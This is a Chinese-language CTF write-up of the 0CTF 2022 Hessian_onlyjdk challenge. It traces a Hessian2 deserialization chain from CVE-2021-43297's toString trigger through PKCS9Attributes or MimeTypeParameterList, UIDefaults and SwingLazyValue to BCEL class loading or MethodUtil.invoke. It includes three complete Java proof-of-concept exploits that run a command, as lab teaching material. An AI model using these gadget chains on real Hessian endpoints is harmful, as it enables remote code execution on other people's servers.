---
title: 0CTF2022 Hessian_onlyjdk
date: 2026-05-16T01:00:38+08:00
lastmod: 2026-05-16T01:00:38+08:00
summary: 品到细糠了
url: /posts/0CTF2022 Hessian_onlyjdk/
categories:
  - javasec
tags:
  - javasec
draft: false
---
附件以及环境地址：https://github.com/waderwu/My-CTF-Challenges/blob/master/0ctf-2022/hessian-onlyJdk/

# 环境部署

直接在deploy目录下部署就可以了

```bash
docker compose up -d --build
```

调试的话把jar包放到idea里面并配上jdk8u342就行了
# 源码分析

题目只给了hessian4.0.38和jdk8u342的依赖

主要类在com.ctf.hessian.onlyJdk.Index

```java
//  
// Source code recreated from a .class file by IntelliJ IDEA  
// (powered by FernFlower decompiler)  
//  
  
package com.ctf.hessian.onlyJdk;  
  
import com.caucho.hessian.io.Hessian2Input;  
import com.sun.net.httpserver.HttpExchange;  
import com.sun.net.httpserver.HttpHandler;  
import com.sun.net.httpserver.HttpServer;  
import java.io.IOException;  
import java.io.InputStream;  
import java.io.OutputStream;  
import java.net.InetSocketAddress;  
import java.util.concurrent.Executors;  
  
public class Index {  
    public static void main(String[] args) throws Exception {  
        System.out.println("server start");  
        HttpServer server = HttpServer.create(new InetSocketAddress(8090), 0);  
        server.createContext("/", new MyHandler());  
        server.setExecutor(Executors.newCachedThreadPool());  
        server.start();  
    }  
  
    static class MyHandler implements HttpHandler {  
        public void handle(HttpExchange t) throws IOException {  
            String response = "Welcome to 0CTF 2022!";  
            InputStream is = t.getRequestBody();  
  
            try {  
                Hessian2Input input = new Hessian2Input(is);  
                input.readObject();  
            } catch (Exception e) {  
                e.printStackTrace();  
                response = "oops! something is wrong";  
            }  
  
            t.sendResponseHeaders(200, (long)response.length());  
            OutputStream os = t.getResponseBody();  
            os.write(response.getBytes());  
            os.close();  
        }  
    }  
}
```

接受请求体数据并用hessian2去反序列化处理最后打印输出

然后题目还有两个hint：

```java
https://lists.apache.org/thread/1mszxrvp90y01xob56yp002939c7hlww

https://x-stream.github.io/CVE-2021-21346.html
```

# 两个Hint

## CVE-2021-43297

第一个是CVE-2021-43297，也就是Apache Dubbo Hessian2异常处理反序列化漏洞，这个之前在hessian反序列化中也有分析过

漏洞点在于`com.caucho.hessian.io.Hessian2Input#expect()`这里

```java
protected IOException expect(String expect, int ch) throws IOException {  
    if (ch < 0) {  
        return this.error("expected " + expect + " at end of file");  
    } else {  
        --this._offset;  
  
        try {  
            int offset = this._offset;  
            String context = this.buildDebugContext(this._buffer, 0, this._length, offset);  
            Object obj = this.readObject();  
            return obj != null ? this.error("expected " + expect + " at 0x" + Integer.toHexString(ch & 255) + " " + obj.getClass().getName() + " (" + obj + ")" + "\n  " + context + "") : this.error("expected " + expect + " at 0x" + Integer.toHexString(ch & 255) + " null");  
        } catch (Exception e) {  
            log.log(Level.FINE, e.toString(), e);  
            return this.error("expected " + expect + " at 0x" + Integer.toHexString(ch & 255));  
        }  
    }  
}
```

![](image/Pasted%20image%2020260517153326.png)

关键点在于**expect() 在报错时，会把刚反序列化出来的对象本身拼进了错误字符串里，从而触发toString方法**。

这条hint给我们提供了一个触发任意类toString的方法

## CVE-2021-21346

第二个hint是CVE-2021-21346，XStream的一条toString利用链

```java
Rdn$RdnEntry#compareTo->
    XString#equal->
        MultiUIDefaults#toString->
            UIDefaults#get->
                UIDefaults#getFromHashTable->
                    UIDefaults$LazyValue#createValue->
                        SwingLazyValue#createValue->
                            InitialContext#doLookup()
```

`sun.swing.SwingLazyValue#createValue`可以调用任意静态方法或者一个构造函数

![](image/Pasted%20image%2020260517160639.png)

 ```java
 public Object createValue(final UIDefaults table) {  
    try {  
        ReflectUtil.checkPackageAccess(className);  //检查当前代码是否有权限访问 className 所在的包。
        Class<?> c = Class.forName(className, true, null);  
        if (methodName != null) {  
            Class[] types = getClassArray(args);  
            Method m = c.getMethod(methodName, types);  
            makeAccessible(m);  
            return m.invoke(c, args);  
        } else {  
            Class[] types = getClassArray(args);  
            Constructor constructor = c.getConstructor(types);  
            makeAccessible(constructor);  
            return constructor.newInstance(args);  
        }  
    } catch (Exception e) {  
        // Ideally we would throw an exception, unfortunately  
        // often times there are errors as an initial look and        // feel is loaded before one can be switched. Perhaps a        // flag should be added for debugging, so that if true        // the exception would be thrown.    }  
    return null;  
}
 ```

但是这条链子是打不通的：

- `javax.swing.MultiUIDefaults`是package-private类，只能在`javax.swing.`中使用，而且Hessian2拿到了构造器，但是没有setAccessable，newInstance就没有权限
- 所以要找链的话需要类是public的，构造器也是public的，构造器的参数个数不要紧，hessian2会自动挨个测试构造器直到成功

并且UIDefaults 是 Hashtable 的子类，所以我们需要找一个toString 触发`Hashtable#get`的gadget

# toString触发get链子寻找
## MimeTypeParameterList触发get

在javax.activation.MimeTypeParameterList的toString方法中

```java
public String toString() {  
    StringBuffer buffer = new StringBuffer();  
    buffer.ensureCapacity(parameters.size() * 16);  
                    //    heuristic: 8 characters per field  
  
    Enumeration keys = parameters.keys();  
    while (keys.hasMoreElements()) {  
        String key = (String)keys.nextElement();  
        buffer.append("; ");  
        buffer.append(key);  
        buffer.append('=');  
        buffer.append(quote((String)parameters.get(key)));  
    }  
  
    return buffer.toString();  
}
```

可以看到这里有一个`parameters.get(key)`的调用，跟进看看这个parameters发现他还是个Hashtable类型的字段

## PKCS9Attributes触发get

```java
public String toString() {  
    StringBuffer buf = new StringBuffer(200);  
    buf.append("PKCS9 Attributes: [\n\t");  
  
    PKCS9Attribute value;  
  
    boolean first = true;  
    for (int i = 1; i < PKCS9Attribute.PKCS9_OIDS.length; i++) {  
        if (PKCS9Attribute.PKCS9_OIDS[i] == null) {  
            continue;  
        }  
        value = getAttribute(PKCS9Attribute.PKCS9_OIDS[i]);  
  
        if (value == null) continue;  
  
        // we have a value; print it  
        if (first)  
            first = false;  
        else  
            buf.append(";\n\t");  
  
        buf.append(value);  
    }  
  
    buf.append("\n\t] (end PKCS9 Attributes)");  
  
    return buf.toString();  
}
```

跟进getAttribute方法

```java
public PKCS9Attribute getAttribute(ObjectIdentifier oid) {  
    return attributes.get(oid);  
}
```

![](image/Pasted%20image%2020260517163634.png)

这个attributes也刚好是Hashtable类型的

找到了触发get的方法之后，我们需要找一下后面createValue触发合适的 public 方法的 gadget

# createValue触发public static方法寻找

## JavaWrapper打BCEL

由于jdk的版本满足加载 BCEL 字节码。找到`JavaWrapper#_main`方法

```java
public static void _main(String[] argv) throws Exception {  
  /* Expects class name as first argument, other arguments are by-passed.  
   */  if(argv.length == 0) {  
    System.out.println("Missing class name.");  
    return;  
  }  
  
  String class_name = argv[0];  
  String[] new_argv = new String[argv.length - 1];  
  System.arraycopy(argv, 1, new_argv, 0, new_argv.length);  
  
  JavaWrapper wrapper = new JavaWrapper();  
  wrapper.runMain(class_name, new_argv);  
}
```

实例化了一个JavaWrapper并调用runMain方法，跟进看看

```java
public void runMain(String class_name, String[] argv) throws ClassNotFoundException  
{  
  Class   cl    = loader.loadClass(class_name);  
  Method method = null;  
  
  try {  
    method = cl.getMethod("_main",  new Class[] { argv.getClass() });  
  
    /* Method _main is sane ?  
     */    int   m = method.getModifiers();  
    Class r = method.getReturnType();  
  
    if(!(Modifier.isPublic(m) && Modifier.isStatic(m)) ||  
       Modifier.isAbstract(m) || (r != Void.TYPE))  
      throw new NoSuchMethodException();  
  } catch(NoSuchMethodException no) {  
    System.out.println("In class " + class_name +  
                       ": public static void _main(String[] argv) is not defined");  
    return;  
  }  
  
  try {  
    method.invoke(null, new Object[] { argv });  
  } catch(Exception ex) {  
    ex.printStackTrace();  
  }  
}
```

loadClass加载类并调用里面的`_main`方法，看看这个loader怎么来的

```java
private java.lang.ClassLoader loader;

public JavaWrapper() {  
  this(getClassLoader());  
}

private static java.lang.ClassLoader getClassLoader() {  
  String s = SecuritySupport.getSystemProperty("bcel.classloader");  
  
  if((s == null) || "".equals(s))  
    s = "com.sun.org.apache.bcel.internal.util.ClassLoader";  
  
  try {  
    return (java.lang.ClassLoader)Class.forName(s).newInstance();  
  } catch(Exception e) {  
    throw new RuntimeException(e.toString());  
  }  
}
```

bcel类加载器？并且当前的jdk版本是可以打bcel类字节码加载的，那可以打BCEL

## MethodUtil打任意代码执行

找public static方法，找到了`sun.reflect.misc.MethodUtil`的invoke方法

```java
public static Object invoke(Method m, Object obj, Object[] params)  
    throws InvocationTargetException, IllegalAccessException {  
    try {  
        return bounce.invoke(null, new Object[] {m, obj, params});  
    } catch (InvocationTargetException ie) {  
        Throwable t = ie.getCause();  
  
        if (t instanceof InvocationTargetException) {  
            throw (InvocationTargetException)t;  
        } else if (t instanceof IllegalAccessException) {  
            throw (IllegalAccessException)t;  
        } else if (t instanceof RuntimeException) {  
            throw (RuntimeException)t;  
        } else if (t instanceof Error) {  
            throw (Error)t;  
        } else {  
            throw new Error("Unexpected invocation error", t);  
        }  
    } catch (IllegalAccessException iae) {  
        // this can't happen  
        throw new Error("Unexpected invocation error", iae);  
    }  
}
```

`bounce.invoke(null, new Object[] {m, obj, params})`实际上进行了两次调用，跟进看看bounce就知道了

```java
private static final Method bounce = getTrampoline();
private static Method getTrampoline() {  
    try {  
        return AccessController.doPrivileged(  
            new PrivilegedExceptionAction<Method>() {  
                public Method run() throws Exception {  
                    Class<?> t = getTrampolineClass();  
                    Class<?>[] types = {  
                        Method.class, Object.class, Object[].class  
                    };  
                    Method b = t.getDeclaredMethod("invoke", types);  
                    b.setAccessible(true);  
                    return b;  
                }  
            });  
    } catch (Exception e) {  
        throw new InternalError("bouncer cannot be found", e);  
    }  
}
```

bounce是一个静态字段，在类初始化时候会自动赋值，所以这里bounce是`Trampoline.invoke(Method,Object,Object[])`

跟进看一下Trampoline.invoke

```java
private static Object invoke(Method m, Object obj, Object[] params)  
    throws InvocationTargetException, IllegalAccessException  
{  
    ensureInvocableMethod(m);  
    return m.invoke(obj, params);  
}
```

所以`return bounce.invoke(null, new Object[] {m, obj, params})`本质上就等价于`m.invoke(obj,params)`

# 链子&POC编写

基于上面的分析，我们可以找到很多可用的链子

## PKCS9Attributes+JavaWrapper打BCEL

链子大致如下：

```java
CVE-2021-43297触发toString->
	sun.security.pkcs.PKCS9Attributes#toString()->
		UIDefaults#get()->
                UIDefaults#getFromHashTable()->
                    UIDefaults$LazyValue#createValue()->
                        SwingLazyValue#createValue()->
							JavaWrapper#_main()
```

POC

先写个恶意类Evil

```java
public class Evil {
    public static void _main(String[] argv) throws Exception {
        Runtime.getRuntime().exec("clac");
    }
}
```

然后我们的poc：

```java
package com.ctf.Hessian_onlyjdk_0CTF2022;  
  
import com.caucho.hessian.io.Hessian2Input;  
import com.caucho.hessian.io.Hessian2Output;  
import com.sun.org.apache.bcel.internal.Repository;  
import com.sun.org.apache.bcel.internal.classfile.Utility;  
import sun.reflect.ReflectionFactory;  
import sun.security.pkcs.PKCS9Attribute;  
import sun.security.pkcs.PKCS9Attributes;  
import sun.swing.SwingLazyValue;  
  
import javax.swing.*;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationTargetException;  
  
public class PKCS9Attributes_JavaWrapperPOC {  
    public static void main(String[] args) throws Exception {  
        PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);  
        UIDefaults uiDefaults = new UIDefaults();  
        String payload = "$$BCEL$$" + Utility.encode(Repository.lookupClass(com.ctf.Hessian_onlyjdk_0CTF2022.Evil.class).getBytes(), true);  
  
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));  
  
        //PKCS9Attributes触发toString  
        setFieldValue(s,"attributes",uiDefaults);  
  
        byte[] poc = serialize(s);  
        unserialize(poc);  
    }  
  
    public static byte[] serialize(Object o) throws Exception {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        Hessian2Output hessian2Output = new Hessian2Output(baos);  
        baos.write(67);  
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);  
        hessian2Output.writeObject(o);  
        hessian2Output.flush();  
        return baos.toByteArray();  
    }  
  
    public static Object unserialize(byte[] bytes) throws Exception {  
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);  
        Hessian2Input hessian2Input = new Hessian2Input(bais);  
        Object o = hessian2Input.readObject();  
        return o;  
    }  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
  
    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {  
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);  
    }  
  
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {  
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);  
        objCons.setAccessible(true);  
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);  
        sc.setAccessible(true);  
        return (T) sc.newInstance(consArgs);  
    }  
}
```

## MimeTypeParameterList+JavaWrapper打BCEL

链子

```java
CVE-2021-43297触发toString->
	javax.activation.MimeTypeParameterList#toString()->
		UIDefaults#get()->
                UIDefaults#getFromHashTable()->
                    UIDefaults$LazyValue#createValue()->
                        SwingLazyValue#createValue()->
							JavaWrapper#_main()
```

POC

```java
package com.ctf.Hessian_onlyjdk_0CTF2022;  
  
import com.caucho.hessian.io.Hessian2Input;  
import com.caucho.hessian.io.Hessian2Output;  
import com.sun.org.apache.bcel.internal.Repository;  
import com.sun.org.apache.bcel.internal.classfile.Utility;  
import sun.reflect.ReflectionFactory;  
import sun.security.pkcs.PKCS9Attribute;  
import sun.swing.SwingLazyValue;  
  
import javax.activation.MimeTypeParameterList;  
import javax.swing.*;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationTargetException;  
  
public class MimeTypeParameterList_JavaWrapperPOC {  
    public static void main(String[] args) throws Exception {  
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();  
        UIDefaults uiDefaults = new UIDefaults();  
        String payload = "$$BCEL$$" + Utility.encode(Repository.lookupClass(com.ctf.Hessian_onlyjdk_0CTF2022.Evil.class).getBytes(), true);  
  
        uiDefaults.put("foo", new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));  
  
        //MimeTypeParameterList触发toString  
        setFieldValue(mimeTypeParameterList,"parameters",uiDefaults);  
  
        byte[] poc = serialize(mimeTypeParameterList);  
        unserialize(poc);  
    }  
  
    public static byte[] serialize(Object o) throws Exception {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        Hessian2Output hessian2Output = new Hessian2Output(baos);  
        baos.write(67);  
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);  
        hessian2Output.writeObject(o);  
        hessian2Output.flush();  
        return baos.toByteArray();  
    }  
  
    public static Object unserialize(byte[] bytes) throws Exception {  
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);  
        Hessian2Input hessian2Input = new Hessian2Input(bais);  
        Object o = hessian2Input.readObject();  
        return o;  
    }  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
  
    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {  
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);  
    }  
  
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {  
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);  
        objCons.setAccessible(true);  
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);  
        sc.setAccessible(true);  
        return (T) sc.newInstance(consArgs);  
    }  
}
```

MimeTypeParameterList和PKCS9Attributes在触发toString的时候有一个tip：

MimeTypeParameterList#toString要求key需要是一个可强制转化成string类型的对象

![](image/Pasted%20image%2020260517175110.png)

而PKCS9Attributes则是要求传入getAttribute的是一个ObjectIdentifier
![](image/Pasted%20image%2020260517175150.png)

所以两条链子上会有些许的不同

## PKCS9Attributes+MethodUtil打RCE

链子就不写了，直接写poc

```java
package com.ctf.Hessian_onlyjdk_0CTF2022;  
  
import com.caucho.hessian.io.Hessian2Input;  
import com.caucho.hessian.io.Hessian2Output;  
import sun.reflect.ReflectionFactory;  
import sun.security.pkcs.PKCS9Attribute;  
import sun.security.pkcs.PKCS9Attributes;  
import sun.swing.SwingLazyValue;  
  
import javax.swing.*;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Method;  
  
public class PKCS9Attributes_MethodUtilPOC {  
    public static void main(String[] args) throws Exception {  
        PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);  
        UIDefaults uiDefaults = new UIDefaults();  
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);  
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);  
  
  
        uiDefaults.put(  
                PKCS9Attribute.EMAIL_ADDRESS_OID,  
                new SwingLazyValue(  
                        "sun.reflect.misc.MethodUtil",  
                        "invoke",  
                        new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}}  
                ));  
  
        //PKCS9Attributes触发toString  
        setFieldValue(s,"attributes",uiDefaults);  
  
        byte[] poc = serialize(s);  
        unserialize(poc);  
    }  
  
    public static byte[] serialize(Object o) throws Exception {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        Hessian2Output hessian2Output = new Hessian2Output(baos);  
        baos.write(67);  
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);  
        hessian2Output.writeObject(o);  
        hessian2Output.flush();  
        return baos.toByteArray();  
    }  
  
    public static Object unserialize(byte[] bytes) throws Exception {  
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);  
        Hessian2Input hessian2Input = new Hessian2Input(bais);  
        Object o = hessian2Input.readObject();  
        return o;  
    }  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
  
    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {  
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);  
    }  
  
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {  
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);  
        objCons.setAccessible(true);  
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);  
        sc.setAccessible(true);  
        return (T) sc.newInstance(consArgs);  
    }  
}
```

这里我一开始有个疑问，就是为什么SwingLazyValue中触发invoke的时候里面的Object数组还要嵌套一层invoke方法的调用呢？

![](image/Pasted%20image%2020260517181405.png)

问了gpt之后我就明白了，其实是跟SwingLazyValue#createValue的方法调用机制有关的

![](image/Pasted%20image%2020260517181531.png)

他会根据参数类型去匹配对应的方法，也就是说，如果我们的poc是这样的

```java
uiDefaults.put(  
        PKCS9Attribute.EMAIL_ADDRESS_OID,  
        new SwingLazyValue(  
                "sun.reflect.misc.MethodUtil",  
                "invoke",  
                new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}  
        ));
```

那么匹配到的invoke需要是这样的

```java
MethodUtil.invoke(Method, Runtime, Object[])
```

但 MethodUtil 里真实存在的方法签名只有：

`MethodUtil.invoke(Method, Object, Object[])`

所以需要内层再嵌套一层invoke的调用

MimeTypeParameterList+MethodUtil的触发链的话也是根据上面的poc相应改一下就行了

# 总结

一开始看了蛮久才入手的，有很多前置知识还没学到，包括hint中的那两个CVE，不得不说确实是一道很好的题目

参考：

https://baozongwi.xyz/p/0ctf-2022-hessian-onlyjdk/

http://www.bmth666.cn/2023/02/07/0CTF-TCTF-2022-hessian-onlyJdk/index.html

https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/#EzJava

https://lists.apache.org/thread/1mszxrvp90y01xob56yp002939c7hlww

https://x-stream.github.io/CVE-2021-21346.html